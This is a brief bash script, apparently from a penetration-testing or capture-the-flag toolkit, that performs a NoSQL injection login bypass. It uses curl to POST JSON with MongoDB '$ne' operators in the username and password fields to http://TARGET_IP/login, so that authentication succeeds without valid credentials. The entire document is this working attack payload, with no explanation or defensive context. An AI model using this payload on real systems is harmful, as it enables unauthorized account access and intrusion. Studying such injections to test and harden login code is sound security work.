#!/bin/bash
# NoSQL Injection Login

curl -s -i -X POST http://TARGET_IP/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
